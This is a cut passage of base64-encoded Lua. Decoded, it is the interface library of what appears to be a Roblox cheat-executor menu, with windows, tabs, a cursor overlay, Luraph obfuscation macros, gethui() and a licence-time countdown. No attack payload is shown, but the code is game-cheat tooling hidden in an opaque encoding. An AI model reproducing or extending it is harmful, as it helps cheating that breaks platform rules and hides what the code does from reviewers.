HdWlJbnNldCA9IHRydWUsCiAgICAgICAgICAgIERpc3BsYXlPcmRlciA9IDk5OTksCiAgICAgICAgICAgIFBhcmVudCA9IGdldGh1aSgpCiAgICAgICAgfSkKCiAgICAgICAgbG9jYWwgY3Vyc29yX2ltYWdlID0gbGlicmFyeTpjcmVhdGUoIkltYWdlTGFiZWwiLCB7CiAgICAgICAgICAgIE5hbWUgPSAiQ3Vyc29yIiwKICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEsCiAgICAgICAgICAgIFNpemUgPSBVRGltMi5uZXcoMCwgMzQsIDAsIDM0KSwKICAgICAgICAgICAgSW1hZ2UgPSBHZXRJbWFnZSgnY3Vyc29yLnBuZycpLAogICAgICAgICAgICBaSW5kZXggPSA2OTY5LAogICAgICAgICAgICBQYXJlbnQgPSBjdXJzb3Jfc2NyZWVuZ3VpCiAgICAgICAgfSkKCiAgICAgICAgcnVuX3NlcnZpY2UuUHJlUmVuZGVyOkNvbm5lY3QoTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICBsb2NhbCBtb3VzZWxvYyA9IHVpczpHZXRNb3VzZUxvY2F0aW9uKCkKICAgICAgICAgICAgY3Vyc29yX2ltYWdlLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIG1vdXNlbG9jLlggLCAwLCBtb3VzZWxvYy5ZKQogICAgICAgIGVuZCkpXV0KICAgIAogICAgLS0gTGlicmFyeSBlbGVtZW50IGZ1bmN0aW9ucwogICAgICAgIGZ1bmN0aW9uIGxpYnJhcnk6d2luZG93KHByb3BlcnRpZXMpCiAgICAgICAgICAgIGxvY2FsIGNmZyA9IHsgCiAgICAgICAgICAgICAgICBzdWZmaXggPSBwcm9wZXJ0aWVzLnN1ZmZpeCBvciBwcm9wZXJ0aWVzLlN1ZmZpeCBvciAidGVjaCI7CiAgICAgICAgICAgICAgICBuYW1lID0gcHJvcGVydGllcy5uYW1lIG9yIHByb3BlcnRpZXMuTmFtZSBvciAibmVidWxhIjsKICAgICAgICAgICAgICAgIGdhbWVfbmFtZSA9IHByb3BlcnRpZXMuZ2FtZUluZm8gb3IgcHJvcGVydGllcy5nYW1lX2luZm8gb3IgcHJvcGVydGllcy5HYW1lSW5mbyBvciAiTWlsZW5pdW0gZm9yIENvdW50ZXItU3RyaWtlOiBHbG9iYWwgT2ZmZW5zaXZlIjsKICAgICAgICAgICAgICAgIHNpemUgPSBwcm9wZXJ0aWVzLnNpemUgb3IgcHJvcGVydGllcy5TaXplIG9yIGRpbTIoMCwgNzAwLCAwLCA1NjUpOwogICAgICAgICAgICAgICAgc2VsZWN0ZWRfdGFiOwogICAgICAgICAgICAgICAgaXRlbXMgPSB7fTsKCiAgICAgICAgICAgICAgICB0d2VlbjsKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgbGlicmFyeVsgIml0ZW1zIiBdID0gbGlicmFyeTpjcmVhdGUoICJTY3JlZW5HdWkiICwgewogICAgICAgICAgICAgICAgUGFyZW50ID0gZ2V0aHVpKCk7CiAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgIEVuYWJsZWQgPSB0cnVlOwogICAgICAgICAgICAgICAgWkluZGV4QmVoYXZpb3IgPSBFbnVtLlpJbmRleEJlaGF2aW9yLkdsb2JhbDsKICAgICAgICAgICAgICAgIElnbm9yZUd1aUluc2V0ID0gdHJ1ZTsKICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIAogICAgICAgICAgICBsaWJyYXJ5WyAib3RoZXIiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlNjcmVlbkd1aSIgLCB7CiAgICAgICAgICAgICAgICBQYXJlbnQgPSBnZXRodWkoKTsKICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgRW5hYmxlZCA9IGZhbHNlOwogICAgICAgICAgICAgICAgWkluZGV4QmVoYXZpb3IgPSBFbnVtLlpJbmRleEJlaGF2aW9yLlNpYmxpbmc7CiAgICAgICAgICAgICAgICBJZ25vcmVHdWlJbnNldCA9IHRydWU7CiAgICAgICAgICAgIH0pOyAKCiAgICAgICAgICAgIC0tIElGIFNISVQgSEFQUEVOIFJFTVZPRSBaSU5ERVgKCiAgICAgICAgICAgIGxvY2FsIGl0ZW1zID0gY2ZnLml0ZW1zOyBkbwogICAgICAgICAgICAgICAgaXRlbXNbICJtYWluIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gbGlicmFyeVsgIml0ZW1zIiBdOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBjZmcuc2l6ZTsKICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMC41LCAtY2ZnLnNpemUuWC5PZmZzZXQgLyAyLCAwLjUsIC1jZmcuc2l6ZS5ZLk9mZnNldCAvIDIpOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMTQsIDE0LCAxNiksCiAgICAgICAgICAgICAgICB9KTsgaXRlbXNbICJtYWluIiBdLlBvc2l0aW9uID0gZGltMigwLCBpdGVtc1sgIm1haW4iIF0uQWJzb2x1dGVQb3NpdGlvbi5YLCAwLCBpdGVtc1sgIm1haW4iIF0uQWJzb2x1dGVQb3NpdGlvbi5ZKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgIm1haW4iIF07CiAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDEwKQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlTdHJva2UiICwgewogICAgICAgICAgICAgICAgICAgIENvbG9yID0gcmdiKDIzLCAyMywgMjkpOwogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAibWFpbiIgXTsKICAgICAgICAgICAgICAgICAgICBBcHBseVN0cm9rZU1vZGUgPSBFbnVtLkFwcGx5U3Ryb2tlTW9kZS5Cb3JkZXIKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpdGVtc1sgInNpZGVfZnJhbWUiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgIm1haW4iIF07CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDAsIDE5NiwgMSwgLTI1KTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMTQsIDE0LCAxNikKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICBBbmNob3JQb2ludCA9IHZlYzIoMSwgMCk7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJzaWRlX2ZyYW1lIiBdOwogICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigxLCAwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMCwgMSwgMSwgMCk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDIxLCAyMSwgMjMpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJidXR0b25faG9sZGVyIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJzaWRlX2ZyYW1lIiBdOwogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCAwLCAwLCA2MCk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIDAsIDEsIC02MCk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICB9KTsgY2ZnLmJ1dHRvbl9ob2xkZXIgPSBpdGVtc1sgImJ1dHRvbl9ob2xkZXIiIF07CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlMaXN0TGF5b3V0IiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImJ1dHRvbl9ob2xkZXIiIF07CiAgICAgICAgICAgICAgICAgICAgUGFkZGluZyA9IGRpbSgwLCA1KTsKICAgICAgICAgICAgICAgICAgICBTb3J0T3JkZXIgPSBFbnVtLlNvcnRPcmRlci5MYXlvdXRPcmRlcgogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlQYWRkaW5nIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nVG9wID0gZGltKDAsIDE2KTsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nQm90dG9tID0gZGltKDAsIDM2KTsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImJ1dHRvbl9ob2xkZXIiIF07CiAgICAgICAgICAgICAgICAgICAgUGFkZGluZ1JpZ2h0ID0gZGltKDAsIDExKTsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nTGVmdCA9IGRpbSgwLCAxMCkKICAgICAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgICAgIGxvY2FsIGFjY2VudCA9IHRoZW1lcy5wcmVzZXQuYWNjZW50CiAgICAgICAgICAgICAgICBpdGVtc1sgInRpdGxlIiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0TGFiZWwiICwgewogICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuZm9udDsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgVGV4dCA9IG5hbWU7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJzaWRlX2ZyYW1lIiBdOwogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIFRleHQgPSBzdHJpbmcuZm9ybWF0KCc8dT4lczwvdT48Zm9udCBjb2xvciA9ICJyZ2IoMjU1LCAyNTUsIDI1NSkiPiVzPC9mb250PicsIGNmZy5uYW1lLCBjZmcuc3VmZml4KTsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAwLCA3MCk7CiAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHRoZW1lcy5wcmVzZXQuYWNjZW50OwogICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgUmljaFRleHQgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMzA7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgfSk7IGxpYnJhcnk6YXBwbHlfdGhlbWUoaXRlbXNbICJ0aXRsZSIgXSwgImFjY2VudCIsICJUZXh0Q29sb3IzIik7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGl0ZW1zWyAibXVsdGlfaG9sZGVyIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJtYWluIiBdOwogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCAxOTYsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAtMTk2LCAwLCA1Nik7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICB9KTsgY2ZnLm11bHRpX2hvbGRlciA9IGl0ZW1zWyAibXVsdGlfaG9sZGVyIiBdOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICBBbmNob3JQb2ludCA9IHZlYzIoMCwgMSk7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJtdWx0aV9ob2xkZXIiIF07CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDAsIDEsIDApOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAwLCAxKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjEsIDIxLCAyMykKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpdGVtc1sgInNoYWRvdyIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiSW1hZ2VMYWJlbCIgLCB7CiAgICAgICAgICAgICAgICAgICAgSW1hZ2VDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgU2NhbGVUeXBlID0gRW51bS5TY2FsZVR5cGUuU2xpY2U7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJtYWluIiBdOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIDc1LCAxLCA3NSk7CiAgICAgICAgICAgICAgICAgICAgQW5jaG9yUG9pbnQgPSB2ZWMyKDAuNSwgMC41KTsKICAgICAgICAgICAgICAgICAgICBJbWFnZSA9ICJyYnhhc3NldGlkOi8vMTEyOTcxMTY3OTk5MDYyIjsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMC41LCAwLCAwLjUsIDApOwogICAgICAgICAgICAgICAgICAgIFNsaWNlU2NhbGUgPSAwLjc1OwogICAgICAgICAgICAgICAgICAgIFpJbmRleCA9IC0xMDA7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBTbGljZUNlbnRlciA9IHJlY3QodmVjMigxMTIsIDExMiksIHZlYzIoMTQ3LCAxNDcpKQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGl0ZW1zWyAiZ2xvYmFsX2ZhZGUiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgIm1haW4iIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDE5NiwgMCwgNTYpOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAtMTk2LCAxLCAtODEpOwogICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigxNCwgMTQsIDE2KTsKICAgICAgICAgICAgICAgICAgICBaSW5kZXggPSAyOwogICAgICAgICAgICAgICAgfSk7ICAgICAgICAgICAgICAgIAoKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAic2hhZG93IiBdOwogICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA1KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGl0ZW1zWyAiaW5mbyIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgIEFuY2hvclBvaW50ID0gdmVjMigwLCAxKTsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgIm1haW4iIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDAsIDEsIDApOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAwLCAyNSk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDIzLCAyMywgMjUpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJpbmZvIiBdOwogICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCAxMCkKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpdGVtc1sgImdyZXlfZmlsbCIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiaW5mbyIgXTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMCwgNik7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDIzLCAyMywgMjUpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJnYW1lIiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0TGFiZWwiICwgewogICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuZm9udDsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImluZm8iIF07CiAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYig3MiwgNzIsIDczKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgVGV4dCA9IGNmZy5nYW1lX25hbWU7CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgQW5jaG9yUG9pbnQgPSB2ZWMyKDAsIDAuNSk7CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDEwLCAwLjUsIC0xKTsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICBUZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdDsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWFk7CiAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICB9KTsgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgbm90IExSTV9TZWNvbmRzTGVmdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgTFJNX1NlY29uZHNMZWZ0ID0gbWF0aC5odWdlCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBsb2NhbCB0aW1lX2xlZnQgPSB0b3N0cmluZygoTFJNX1NlY29uZHNMZWZ0IDwgbWF0aC5odWdlIGFuZCAiIi4udG9zdHJpbmcobWF0aC5mbG9vcigoKExSTV9TZWNvbmRzTGVmdCAvIDYwKSAvIDYwKSAvIDI0KSkuLiIgZGF5cyIgb3IgTFJNX1NlY29uZHNMZWZ0ID09IG1hdGguaHVnZSBhbmQgImxpZmV0aW1lIikpCgogICAgICAgICAgICAgICAgaXRlbXNbICJvdGhlcl9pbmZvIiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0TGFiZWwiICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiaW5mbyIgXTsKICAgICAgICAgICAgICAgICAgICBSaWNoVGV4dCA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHRoZW1lcy5wcmVzZXQuYWNjZW50OwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBUZXh0ID0gJzxmb250IGNvbG9yPSJyZ2IoNzIsIDcyLCA3MykiPicuLnRpbWVfbGVmdC4uJywgPC9mb250PicgLi4gY2ZnLm5hbWU6bG93ZXIoKSAuLiBjZmcuc3VmZml4Omxvd2VyKCk7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIC0xMCwgMC41LCAtMSk7CiAgICAgICAgICAgICAgICAgICAgQW5jaG9yUG9pbnQgPSB2ZWMyKDAsIDAuNSk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICBUZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuUmlnaHQ7CiAgICAgICAgICAgICAgICAgICAgQXV0b21hdGljU2l6ZSA9IEVudW0uQXV0b21hdGljU2l6ZS5YWTsKICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLmZvbnQ7CiAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICB9KTsgbGlicmFyeTphcHBseV90aGVtZShpdGVtc1sgIm90aGVyX2luZm8iIF0sICJhY2NlbnQiLCAiVGV4dENvbG9yMyIpOyAgICAgICAgCiAgICAgICAgICAgIGVuZCAKCiAgICAgICAgICAgIGRvIC0tIE90aGVyCiAgICAgICAgICAgICAgICBsaWJyYXJ5OmRyYWdnaWZ5KGl0ZW1zWyAibWFpbiIgXSkKICAgICAgICAgICAgICAgIGxpYnJhcnk6cmVzaXppZnkoaXRlbXNbICJtYWluIiBdKQogICAgICAgICAgICBlbmQgCgogICAgICAgICAgICBmdW5jdGlvbiBjZmcudG9nZ2xlX21lbnUoYm9vbCkgCiAgICAgICAgICAgICAgICAtLSBXSVAgCiAgICAgICAgICAgICAgICAtLSBpZiBjZmcudHdlZW4gdGhlbiAKICAgICAgICAgICAgICAgIC0tICAgICBjZmcudHdlZW46Q2FuY2VsKCkKICAgICAgICAgICAgICAgIC0tIGVuZCAKCiAgICAgICAgICAgICAgICAtLSBpdGVtc1sgIm1haW4iIF0uU2l6ZSA9IGRpbTIoaXRlbXNbICJtYWluIiBdLlNpemUuU2NhbGUuWCwgaXRlbXNbICJtYWluIiBdLlNpemUuT2Zmc2V0LlggLSAyMCwgaXRlbXNbICJtYWluIiBdLlNpemUuU2NhbGUuWSwgaXRlbXNbICJtYWluIiBdLlNpemUuT2Zmc2V0LlkgLSAyMCkKICAgICAgICAgICAgICAgIC0tIGxpYnJhcnk6dHdlZW4oaXRlbXNbICJ0YWJfaG9sZGVyIiBdLCB7U2l6ZSA9IGRpbTIoMSwgLTE5NiwgMSwgLTgxKX0sIEVudW0uRWFzaW5nU3R5bGUuUXVhZCwgMC40KQogICAgICAgICAgICAgICAgLS0gY2ZnLnR3ZWVuID0gCiAgICAgICAgICAgICAgICAtLWN1cnNvcl9pbWFnZS5WaXNpYmxlID0gYm9vbAogICAgICAgICAgICAgICAgLS11aXMuTW91c2VJY29uRW5hYmxlZCA9IG5vdCBib29sCiAgICAgICAgICAgICAgICBsaWJyYXJ5WyAiaXRlbXMiIF0uRW5hYmxlZCA9IGJvb2wKICAgICAgICAgICAgZW5kIAoKICAgICAgICAgICAgUnVuU2VydmljZS5SZW5kZXJTdGVwcGVkOkNvbm5lY3QoTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgaWYgbGlicmFyeVsgIml0ZW1zIiBdLkVuYWJsZWQgYW5kIG5vdCB1aXMuTW91c2VJY29uRW5hYmxlZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgdWlzLk1vdXNlSWNvbkVuYWJsZWQgPSB0cnVlCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKSkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICByZXR1cm4gc2V0bWV0YXRhYmxlKGNmZywgbGlicmFyeSkKICAgICAgICBlbmQgCgogICAgICAgIGZ1bmN0aW9uIGxpYnJhcnk6dGFiKHByb3BlcnRpZXMpCiAgICAgICAgICAgIGxvY2FsIGNmZyA9IHsKICAgICAgICAgICAgICAgIG5hbWUgPSBwcm9wZXJ0aWVzLm5hbWUgb3IgcHJvcGVydGllcy5OYW1lIG9yICJ2aXN1YWxzIjsgCiAgICAgICAgICAgICAgICBpY29uID0gcHJvcGVydGllcy5pY29uIG9yIHByb3BlcnRpZXMuSWNvbiBvciAiaHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD02MDM0NzY3NjA4IjsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLS0gbXVsdGkgCiAgICAgICAgICAgICAgICB0YW